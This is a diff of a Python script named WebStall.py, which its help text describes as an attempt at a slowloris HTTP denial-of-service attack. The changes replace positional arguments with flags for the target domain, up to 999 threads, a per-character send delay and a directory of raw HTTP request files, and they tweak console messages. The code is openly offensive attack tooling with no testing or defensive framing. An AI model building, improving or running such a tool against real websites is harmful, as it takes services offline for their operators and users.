@@ -18,16 +18,51 @@ import socket
 import errno
 
 #
-# Print App Header
+# Print Help
 #
-print("###################################################")
-print("## W E B - S T A L L                       v.0.1  #")
-print("###################################################")
-print("## Usage:                                          ")
-print("##   ./WebStall.py <domain> <threads> <delay sec>  ")                       
-print("## Example:                                        ")
-print("##   ./WebStall.py www.mydomain.com 100 10         ")
-print("##                                                 ")
+def PrintHelp():
+    print("")
+    print("Usage:")
+    print(" WebStall.py [options]")
+    print("")
+    print("An attemt at slow loris HTTP attack")                       
+    print("")
+    print("Options:")
+    print(" -h, --help                 display this help")
+    print(" -a, --address      (1)     domain")
+    print(" -d, --directory            directory with HTTP request files")
+    print(" -t, --threads      (2)       number of threads.")
+    print(" -s, --sleep                HTTP request chars delay - in seconds")
+    print(" -e, --extension    (3)     HTTP request file extension")
+    print("")
+    print("(1) Required field")
+    print("(2) Min: 1, Max: 999")
+    print("(3) Default is .txt")
+    print("")
+
+#
+# Get Arg Value
+#
+def GetArgValue(token1, token2):
+    count = len(sys.argv)
+    count -= 1
+    i = 0
+    while i < count:
+        if sys.argv[i] == str(token1) or sys.argv[i] == str(token2):
+            return sys.argv[i+1]
+        i += 1
+    return ""
+
+def GetHasArgValue(token1, token2):
+    count = len(sys.argv)
+    count -= 1
+    i = 0
+    while i < count:
+        if sys.argv[i] == str(token1) or sys.argv[i] == str(token2):
+            return True
+        i += 1
+    return False
+
 #
 # Global ApplicationLog object
 #
@@ -38,7 +73,7 @@ Flag = True
 # PrintToConsole method
 #
 def PrintToConsole(thread_number, msg):
-    print("Thread %04d :: %s" % (thread_number, msg))
+    print("Thread %03d :: %s" % (thread_number, msg))
 
 class WebStallThread (threading.Thread):
    def __init__(self, domain, delay_sec, thread_number):
@@ -91,6 +126,7 @@ class WebStallThread (threading.Thread):
                 si += 1
     except KeyboardInterrupt as ki:
         PrintToConsole(self.thread_number, "> Keyboard Interrupt <")
+        print("> Waiting for Threads to Finish <")
         Flag = False
         do_exit = True
         ihttp.CloseHttpSocket(s)
@@ -101,30 +137,48 @@ class WebStallThread (threading.Thread):
 # Main 
 #
 print("> Starting <")
-if ( len(sys.argv) != 4 ):
-    AppLog.LogError("Invalid number of arguments!")
-    AppLog.PrintToConsole()
-    exit(1)
 
-domain = "" #: domains
-ttc = 1     #: threads
-tts = 1     #: delay in seconds
-
+domain = ""             #: domain
+ttc = 1                 #: threads
+tts = 0                 #: sleep sec
+directory = ""          #: directory
+extension = ".txt"      #: direcory extensions to look for
 try:
-    domain = str(sys.argv[1]) #: domain
-    ttc = int(sys.argv[2])    #: threads
-    tts = int(sys.argv[3])    #: delay in seconds
+    if GetHasArgValue("-h", "--help"):
+        PrintHelp()
+        exit(0)
+    
+    domain = str(GetArgValue("-a","--address"))         #: domain
+    if len(domain) <= 0:
+        PrintHelp()
+        exit(1)
+
+    tmp = GetArgValue("-t","--threads")
+    if len(tmp) > 0:
+        try:
+            ttc = int(GetArgValue("-t", "--threads"))   #: threads
+            if ttc <= 0 or ttc > 999:
+                PrintHelp()
+                exit(1)
+        except ValueError:
+            ttc = 1
+
+    tmp = GetArgValue("-s", "--sleep")
+    if len(tmp) > 0:
+        try:
+            tts = int(GetArgValue("-s", "--sleep"))     #: delay in seconds
+        except ValueError:
+            tts = 0
+    
+    directory = str(GetArgValue("-d", "--directory"))   #: directory with http request files
+    extension = str(GetArgValue("-e", "--extension"))
 except ValueError as ex:
     AppLog.LogError("One or more Invalid parameter!")
     AppLog.PrintToConsole()
     exit(3)
 
-if ( ttc <= 0 or ttc >= 9999 ):
-    AppLog.LogError("Invalid number of threads. Must be between 1 and 9999.")
-    AppLog.PrintToConsole()
-    exit(2)
-
 print("> Creating Threads <")
+
 thread_list = []
 i = 0
 while i < ttc:
@@ -135,13 +189,14 @@ print("> Running Threads <")
 for a in thread_list:
     a.start()
 
-print("> Waiting for Threads to Finish")
+print("> Working <")
 try:
 
     for a in thread_list:
         a.join()
 
 except KeyboardInterrupt as ki:
+    print("")
     print("> Keyboard Interrupt <")
     print("> Waiting for Threads to Finish <")
     Flag = False
